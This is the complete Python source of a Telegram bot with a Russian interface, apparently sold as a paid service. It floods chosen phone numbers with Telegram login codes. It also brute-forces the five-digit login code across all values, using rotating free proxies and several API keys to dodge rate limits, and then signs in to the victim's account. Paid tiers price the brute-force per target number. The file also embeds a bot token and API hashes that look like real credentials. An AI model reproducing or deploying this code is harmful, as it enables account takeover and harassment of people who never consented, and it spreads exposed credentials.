from telethon import TelegramClient, functions, types as telethon_types
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
import asyncio
import logging
import random
import re
import requests
import os
from datetime import datetime, timedelta

# ===== КОНФИГ =====
BOT_TOKEN = "8979594440:AAGfEOb84G4KS0kqNOfdODZVcIUXOoaELTY"
ADMIN_ID = 7989621596

# ===== ХРАНИЛИЩЕ В ПАМЯТИ =====
users = {}  # {user_id: {"rank": "vip", "expire": "2024-..."}}

# ===== ЧЁРНЫЙ СПИСОК =====
BLACKLIST_PHONES = [
    "+19314121824",
    "+79042616935",
    "+79964813813"
]

# ===== API КЛЮЧИ =====
API_KEYS = [
    {"api_id": 94575, "api_hash": "a3406de8d171bb422bb6ddf3bbd800e2"},
    {"api_id": 2040, "api_hash": "b18441a1ff607e10a989891a5462e627"},
    {"api_id": 2496, "api_hash": "8da85b0d5bfe62527e5b244c209159c3"},
    {"api_id": 17349, "api_hash": "344583e45741c457fe1862106095a5eb"},
    {"api_id": 15233, "api_hash": "d544bc5d4f6f08f1c5f9e8c7d3b2a1f4"},
]

# ===== НАСТРОЙКА =====
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_states = {}

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_phone_blacklisted(phone):
    for bl in BLACKLIST_PHONES:
        if bl in phone or phone in bl:
            return True
    return False

def get_user_rank(user_id):
    if user_id == ADMIN_ID:
        return 'admin'
    data = users.get(user_id, {})
    rank = data.get('rank', 'user')
    expire = data.get('expire')
    if expire:
        try:
            if datetime.now() > datetime.fromisoformat(expire):
                users[user_id] = {'rank': 'user', 'expire': None}
                return 'user'
        except:
            pass
    return rank

def set_user_rank(user_id, rank, days=30):
    expire = (datetime.now() + timedelta(days=days)).isoformat() if days else None
    users[user_id] = {'rank': rank, 'expire': expire}
    return True

# ===== ПРОКСИ =====
PROXY_POOL = []
WORKING_PROXIES = []

def load_proxies():
    global PROXY_POOL
    PROXY_POOL = []
    proxy_sources = [
        "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
        "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/lists/http.txt",
        "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/lists/socks5.txt",
    ]
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                for proxy in proxies:
                    if proxy not in PROXY_POOL:
                        PROXY_POOL.append(proxy)
                print(f"✅ Загружено {len(proxies)} прокси из {url}")
        except Exception as e:
            print(f"❌ Ошибка загрузки {url}: {e}")
    print(f"📊 Всего прокси: {len(PROXY_POOL)}")
    return PROXY_POOL

def check_proxy(proxy):
    try:
        test = requests.get("https://api.telegram.org", proxies={"http": proxy, "https": proxy}, timeout=5)
        return test.status_code == 200
    except:
        return False

def get_working_proxy():
    if WORKING_PROXIES:
        proxy = random.choice(WORKING_PROXIES)
        if check_proxy(proxy):
            return proxy
        else:
            WORKING_PROXIES.remove(proxy)
            return get_working_proxy()
    return None

# ===== СЛОВАРЬ ДЛЯ БРУТФОРСА =====
SMART_DICT = [
    "12345", "00000", "11111", "22222", "33333", "44444", "55555",
    "66666", "77777", "88888", "99999", "54321", "12340",
    "12321", "01234", "98765", "23456", "34567", "45678", "56789",
    "87654", "76543", "65432", "0101", "0202", "0303", "0404", "0505",
    "0606", "0707", "0808", "0909", "1010", "1111", "1212", "1231", "1225",
]

# ===== КЛАВИАТУРЫ =====
def main_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    rank = get_user_rank(user_id)
    
    builder.row(InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code"))
    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
    builder.row(InlineKeyboardButton(text="💳 Магазин", callback_data="shop"))
    
    if rank in ['vip', 'admin']:
        builder.row(
            InlineKeyboardButton(text="🔑 Вход по коду", callback_data="login_code"),
            InlineKeyboardButton(text="⚡ Брутфорс", callback_data="bruteforce")
        )
    
    if is_admin(user_id):
        builder.row(InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel"))
    
    return builder.as_markup()

def shop_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔓 UNLOCK месяц 99 ₽", callback_data="buy_unlock"),
        InlineKeyboardButton(text="🔓 UNLOCK навсегда 799 ₽", callback_data="buy_unlock_forever")
    )
    builder.row(
        InlineKeyboardButton(text="💎 VIP месяц 199 ₽", callback_data="buy_vip"),
        InlineKeyboardButton(text="💎 VIP навсегда 1999 ₽", callback_data="buy_vip_forever")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Брутфорс 1 номер 119 ₽", callback_data="buy_bruteforce"),
        InlineKeyboardButton(text="⚡ Брутфорс 5 номеров 500 ₽", callback_data="buy_bruteforce_5")
    )
    builder.row(
        InlineKeyboardButton(text="🤖 АнтиБот месяц 199 ₽", callback_data="buy_antibot")
    )
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def admin_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔓 Выдать UNLOCK", callback_data="admin_set_unlock"),
        InlineKeyboardButton(text="💎 Выдать VIP", callback_data="admin_set_vip")
    )
    builder.row(
        InlineKeyboardButton(text="🤖 Выдать АнтиБот", callback_data="admin_set_antibot"),
        InlineKeyboardButton(text="🚫 Снять подписку", callback_data="admin_remove_rank")
    )
    builder.row(
        InlineKeyboardButton(text="🚫 Удалить из ЧС", callback_data="admin_remove_blacklist"),
        InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list_users")
    )
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def back_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def get_product_links():
    return {
        "unlock": {"name": "🔓 UNLOCK месяц", "price": "99 ₽", "link": "http://t.me/send?start=IVzJRBFjchnb"},
        "unlock_forever": {"name": "🔓 UNLOCK навсегда", "price": "799 ₽", "link": "http://t.me/send?start=IVtaoL6KvIhV"},
        "vip": {"name": "💎 VIP месяц", "price": "199 ₽", "link": "http://t.me/send?start=IV83endACqV3"},
        "vip_forever": {"name": "💎 VIP навсегда", "price": "1999 ₽", "link": "http://t.me/send?start=IVqj0t9rdzAH"},
        "bruteforce": {"name": "⚡ Брутфорс 1 номер", "price": "119 ₽", "link": "http://t.me/send?start=IVZJCvYwUc8C"},
        "bruteforce_5": {"name": "⚡ Брутфорс 5 номеров", "price": "500 ₽", "link": "http://t.me/send?start=IVULVz96o0NQ"},
        "antibot": {"name": "🤖 АнтиБот месяц", "price": "199 ₽", "link": "http://t.me/send?start=IVtaoL6KvIhV"}
    }

# ===== ПУЛ КЛИЕНТОВ =====
class TelegramPool:
    def __init__(self, api_keys, pool_size=5):
        self.api_keys = api_keys
        self.pool_size = pool_size
        self.clients = []
        self.lock = asyncio.Lock()
        self.last_used = {}
    
    async def get_client(self):
        async with self.lock:
            while len(self.clients) < self.pool_size:
                key = self.api_keys[len(self.clients) % len(self.api_keys)]
                proxy = get_working_proxy()
                if proxy:
                    client = TelegramClient(f'pool_{len(self.clients)}', key["api_id"], key["api_hash"], proxy=("http", proxy))
                else:
                    client = TelegramClient(f'pool_{len(self.clients)}', key["api_id"], key["api_hash"])
                await client.connect()
                self.clients.append((client, key))
                self.last_used[len(self.clients)-1] = datetime.now()
            min_used = min(self.last_used, key=self.last_used.get)
            self.current_index = min_used
            self.last_used[min_used] = datetime.now()
            return self.clients[self.current_index]
    
    async def close_all(self):
        for client, _ in self.clients:
            try:
                await client.disconnect()
            except:
                pass

pool = TelegramPool(API_KEYS, pool_size=5)

# ===== ОТПРАВКА КОДА =====
async def send_code_fast_pool(phone):
    if is_phone_blacklisted(phone):
        return {"success": False, "error": "Номер в чёрном списке"}
    client = None
    try:
        client, key = await pool.get_client()
        result = await client(functions.auth.SendCodeRequest(
            phone_number=phone,
            api_id=key["api_id"],
            api_hash=key["api_hash"],
            settings=telethon_types.CodeSettings()
        ))
        return {"success": True, "hash": result.phone_code_hash}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except:
                pass

async def send_with_smart_wait(phone, max_retries=3):
    for attempt in range(max_retries):
        result = await send_code_fast_pool(phone)
        if result["success"]:
            return result
        error = result.get("error", "")
        wait_match = re.search(r'wait of (\d+) seconds', error)
        if wait_match:
            wait_seconds = min(int(wait_match.group(1)) + 3, 120)
            await asyncio.sleep(wait_seconds)
            continue
        await asyncio.sleep(3)
    return {"success": False, "error": "Превышено число попыток"}

async def spam_codes(phone, count):
    results = []
    sent = 0
    failed = 0
    current_wait = 0
    
    for i in range(count):
        if current_wait > 0:
            wait_time = min(current_wait + 3, 120)
            results.append(f"⏳ Ожидание {wait_time} сек...")
            await asyncio.sleep(wait_time)
            current_wait = 0
        
        result = await send_with_smart_wait(phone)
        
        if result["success"]:
            sent += 1
            results.append(f"✅ Код {i+1} отправлен")
        else:
            error = result.get("error", "")
            if "wait of" in error.lower():
                wait_match = re.search(r'wait of (\d+) seconds', error)
                current_wait = int(wait_match.group(1)) if wait_match else 30
                results.append(f"⏳ Ожидание {current_wait} сек")
                continue
            failed += 1
            results.append(f"❌ Код {i+1}: {error}")
        
        await asyncio.sleep(random.uniform(1.5, 3))
    
    return results, sent, failed

# ===== ВХОД ПО КОДУ =====
async def login_with_code(phone, code):
    result = await send_code_fast_pool(phone)
    if not result["success"]:
        return {"success": False, "error": result["error"]}
    hash = result["hash"]
    
    client = None
    try:
        client, key = await pool.get_client()
        await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
        me = await client.get_me()
        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except:
                pass

async def login_with_retry(phone, code):
    for i in range(3):
        result = await login_with_code(phone, code)
        if result["success"]:
            return result
        await asyncio.sleep(2)
    return {"success": False, "error": "3 попытки не удались"}

# ===== БРУТФОРС =====
async def bruteforce_block_reverse(phone, hash, start, end):
    for idx, code in enumerate(range(start, end - 1, -1)):
        client = None
        try:
            client, key = await pool.get_client()
            await client.sign_in(phone=phone, code=str(code).zfill(5), phone_code_hash=hash)
            return str(code).zfill(5)
        except:
            continue
        finally:
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
    return None

async def fast_bruteforce_reverse(phone):
    result = await send_code_fast_pool(phone)
    if not result["success"]:
        return {"success": False, "error": result["error"]}
    
    hash = result["hash"]
    total_codes = 100000
    
    for code in SMART_DICT[::-1]:
        client = None
        try:
            client, key = await pool.get_client()
            await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
            return {"success": True, "code": code, "method": "словарь"}
        except:
            continue
        finally:
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
    
    tasks = []
    block_size = 2000
    for start in range(total_codes - 1, -1, -block_size):
        end = max(start - block_size + 1, 0)
        tasks.append(bruteforce_block_reverse(phone, hash, start, end))
    
    results = await asyncio.gather(*tasks)
    for r in results:
        if r:
            return {"success": True, "code": r, "method": "параллельный"}
    
    return {"success": False}

# ===== КОМАНДЫ =====
@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    rank = get_user_rank(user_id)
    
    rank_names = {
        'admin': '👑 АДМИН',
        'vip': '💎 VIP',
        'antibot': '🤖 АнтиБот',
        'unlock': '🔓 UNLOCK',
        'user': '👤 ПОЛЬЗОВАТЕЛЬ'
    }
    
    rank_display = rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')
    
    await message.answer(
        f"⚡ ПОМОЩНИК С КОДАМИ\n\n"
        f"Твой ранг: {rank_display}",
        reply_markup=main_keyboard(user_id)
    )

# ===== ЭКСПОРТ ПОЛЬЗОВАТЕЛЕЙ =====
@dp.message(Command("export_users"))
async def export_users(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Только для админа")
        return
    
    if not users:
        await message.answer("📋 Нет пользователей в базе")
        return
    
    text = "📋 СПИСОК ПОЛЬЗОВАТЕЛЕЙ:\n\n"
    for user_id, data in users.items():
        rank = data.get('rank', 'user')
        expire = data.get('expire', 'нет')
        text += f"👤 {user_id} — {rank.upper()} (до {expire})\n"
    
    if len(text) > 4000:
        filename = f"users_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(text)
        with open(filename, "rb") as f:
            await message.answer_document(
                types.BufferedInputFile(f.read(), filename=filename),
                caption="📁 ВСЕ ПОЛЬЗОВАТЕЛИ"
            )
        os.remove(filename)
    else:
        await message.answer(text)

# ===== CALLBACK HANDLER =====
@dp.callback_query()
async def callback_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    rank = get_user_rank(user_id)
    
    if not is_admin(user_id) and rank not in ['unlock', 'vip', 'antibot', 'admin']:
        await callback.answer("🚫 Нет доступа", show_alert=True)
        return
    
    data = callback.data
    
    if data == "back":
        await callback.message.edit_text(
            "⚡ ПОМОЩНИК С КОДАМИ",
            reply_markup=main_keyboard(user_id)
        )
        await callback.answer()
        return
    
    if data == "shop":
        await callback.message.edit_text("💳 МАГАЗИН", reply_markup=shop_keyboard())
        await callback.answer()
        return
    
    if data == "profile":
        rank = get_user_rank(user_id)
        rank_names = {'admin': '👑 АДМИН', 'vip': '💎 VIP', 'antibot': '🤖 АнтиБот', 'unlock': '🔓 UNLOCK', 'user': '👤 ПОЛЬЗОВАТЕЛЬ'}
        await callback.message.edit_text(
            f"👤 ПРОФИЛЬ\n\nРанг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}",
            reply_markup=back_keyboard()
        )
        await callback.answer()
        return
    
    if data.startswith("buy_"):
        product_key = data.replace("buy_", "")
        products = get_product_links()
        if product_key in products:
            product = products[product_key]
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить", url=product["link"])],
                [InlineKeyboardButton(text="🔙 Назад", callback_data="shop")]
            ])
            await callback.message.edit_text(
                f"💳 ОФОРМЛЕНИЕ ЗАКАЗА\n\n"
                f"Товар: {product['name']}\n"
                f"Цена: {product['price']}",
                reply_markup=keyboard
            )
            await callback.answer()
            return
    
    if data == "admin_panel":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("👑 АДМИН-ПАНЕЛЬ", reply_markup=admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_set_unlock":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🔓 Введи ID для UNLOCK:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_unlock"}
        await callback.answer()
        return
    
    if data == "admin_set_vip":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("💎 Введи ID для VIP:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_vip"}
        await callback.answer()
        return
    
    if data == "admin_set_antibot":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🤖 Введи ID для АнтиБот:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_antibot"}
        await callback.answer()
        return
    
    if data == "admin_remove_rank":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🚫 Введи ID для снятия подписки:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_remove_rank"}
        await callback.answer()
        return
    
    if data == "admin_remove_blacklist":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🚫 Введи номер для удаления из ЧС:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_remove_blacklist"}
        await callback.answer()
        return
    
    if data == "admin_list_users":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        if not users:
            text = "📋 ПОЛЬЗОВАТЕЛИ:\n\nНет пользователей"
        else:
            text = "📋 ПОЛЬЗОВАТЕЛИ:\n\n"
            for uid, data in users.items():
                status = "👑 ADMIN" if uid == ADMIN_ID else data.get('rank', 'user').upper()
                text += f"{status} — {uid}\n"
        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
        await callback.answer()
        return
    
    if data == "send_code":
        await callback.message.edit_text(
            "📤 Введи номер и количество\nПример: +71234567890 1",
            reply_markup=back_keyboard()
        )
        user_states[user_id] = {"action": "waiting_spam"}
        await callback.answer()
        return
    
    if data == "login_code":
        if rank not in ['vip', 'admin']:
            await callback.answer("💎 Только для VIP", show_alert=True)
            return
        await callback.message.edit_text("🔑 Введи номер и код:\n+79031234567 12345", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "waiting_login"}
        await callback.answer()
        return
    
    if data == "bruteforce":
        if rank not in ['vip', 'admin']:
            await callback.answer("💎 Только для VIP", show_alert=True)
            return
        await callback.message.edit_text("⚡ Введи номер:\n+79031234567", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "waiting_bruteforce"}
        await callback.answer()
        return

# ===== ОБРАБОТЧИК ТЕКСТА =====
@dp.message()
async def text_handler(message: types.Message):
    user_id = message.from_user.id
    rank = get_user_rank(user_id)
    
    if rank == 'user' and not is_admin(user_id):
        await message.answer("🚫 Нет доступа. Купи подписку!")
        return
    
    if user_id not in user_states:
        await message.answer("Используй кнопки", reply_markup=main_keyboard(user_id))
        return
    
    action = user_states[user_id].get("action")
    text = message.text.strip()
    
    if not text:
        await message.answer("❌ Введите текст")
        return
    
    # ===== ADMIN: ВЫДАТЬ UNLOCK =====
    if action == "admin_set_unlock":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            set_user_rank(target, 'unlock', 30)
            await message.answer(f"✅ {target} теперь UNLOCK")
            try:
                await bot.send_message(target, f"⚒️ Вам выдан UNLOCK на 30 дней")
            except:
                pass
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: ВЫДАТЬ VIP =====
    if action == "admin_set_vip":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            set_user_rank(target, 'vip', 30)
            await message.answer(f"✅ {target} теперь VIP")
            try:
                await bot.send_message(target, f"⚒️ Вам выдан VIP на 30 дней")
            except:
                pass
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: ВЫДАТЬ АНТИБОТ =====
    if action == "admin_set_antibot":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            set_user_rank(target, 'antibot', 30)
            await message.answer(f"✅ {target} теперь АнтиБот")
            try:
                await bot.send_message(target, f"⚒️ Вам выдан АнтиБот на 30 дней")
            except:
                pass
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: СНЯТЬ ПОДПИСКУ =====
    if action == "admin_remove_rank":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            if target == ADMIN_ID:
                await message.answer("❌ Нельзя снять админа")
            else:
                set_user_rank(target, 'user', 0)
                await message.answer(f"✅ Подписка снята с {target}")
                try:
                    await bot.send_message(target, f"🚫 Ваша подписка снята")
                except:
                    pass
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: УДАЛИТЬ ИЗ ЧС =====
    if action == "admin_remove_blacklist":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        phone = text.strip()
        if phone in BLACKLIST_PHONES:
            BLACKLIST_PHONES.remove(phone)
            await message.answer(f"✅ {phone} удалён из ЧС")
        else:
            await message.answer(f"❌ {phone} не найден в ЧС")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ОТПРАВКА КОДОВ =====
    if action == "waiting_spam":
        parts = text.split()
        if len(parts) != 2:
            await message.answer("❌ Формат: +71234567890 1")
            return
        
        phone = parts[0]
        if not phone.startswith('+'):
            phone = '+' + phone
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await message.answer("❌ Неверный формат номера")
            del user_states[user_id]
            return
        
        if is_phone_blacklisted(phone):
            await message.answer("❌ Номер в ЧС")
            del user_states[user_id]
            return
        
        try:
            count = int(parts[1])
            if is_admin(user_id):
                max_count = 999999
            elif rank == 'vip':
                max_count = 100
            elif rank in ['unlock', 'antibot']:
                max_count = 20
            else:
                max_count = 0
            if count < 1 or count > max_count:
                await message.answer(f"❌ От 1 до {max_count}")
                return
        except ValueError:
            await message.answer("❌ Введи число")
            return
        
        status_msg = await message.answer(f"⏳ Отправка {count} кодов на {phone}...")
        results, sent, failed = await spam_codes(phone, count)
        await status_msg.edit_text(
            f"📨 РЕЗУЛЬТАТ\n\nНомер: {phone}\nВсего: {count}\n✅ Успешно: {sent}\n❌ Ошибок: {failed}",
            reply_markup=main_keyboard(user_id)
        )
        del user_states[user_id]
        return
    
    # ===== ВХОД ПО КОДУ =====
    if action == "waiting_login":
        parts = text.split()
        if len(parts) != 2:
            await message.answer("❌ Формат: +79031234567 12345")
            return
        
        phone = parts[0]
        if not phone.startswith('+'):
            phone = '+' + phone
        
        code = parts[1]
        if not code.isdigit() or len(code) != 5:
            await message.answer("❌ Код должен быть 5 цифр")
            del user_states[user_id]
            return
        
        await message.answer(f"⏳ Вход...")
        result = await login_with_retry(phone, code)
        if result["success"]:
            await message.answer(f"✅ ВОШЁЛ\n\n👤 {result['first_name']}\n🔹 @{result['username']}", reply_markup=main_keyboard(user_id))
        else:
            await message.answer(f"❌ {result['error']}", reply_markup=main_keyboard(user_id))
        del user_states[user_id]
        return
    
    # ===== БРУТФОРС =====
    if action == "waiting_bruteforce":
        if rank not in ['vip', 'admin']:
            await message.answer("💎 Только для VIP")
            del user_states[user_id]
            return
        
        phone = text.strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await message.answer("❌ Неверный формат номера")
            del user_states[user_id]
            return
        
        if is_phone_blacklisted(phone):
            await message.answer("❌ Номер в ЧС")
            del user_states[user_id]
            return
        
        status_msg = await message.answer(f"⚡ Брутфорс {phone}...")
        result = await fast_bruteforce_reverse(phone)
        if result["success"]:
            login_result = await login_with_code(phone, result["code"])
            if login_result["success"]:
                await status_msg.edit_text(f"✅ КОД: {result['code']}\n✅ ВОШЁЛ: @{login_result['username']}", reply_markup=main_keyboard(user_id))
            else:
                await status_msg.edit_text(f"✅ КОД: {result['code']}\n❌ Ошибка входа", reply_markup=main_keyboard(user_id))
        else:
            await status_msg.edit_text(f"❌ Код не найден", reply_markup=main_keyboard(user_id))
        del user_states[user_id]
        return

# ===== ЗАПУСК =====
async def main():
    print("🤖 БОТ ЗАПУЩЕН!")
    load_proxies()
    print(f"🌐 Прокси загружено: {len(PROXY_POOL)}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
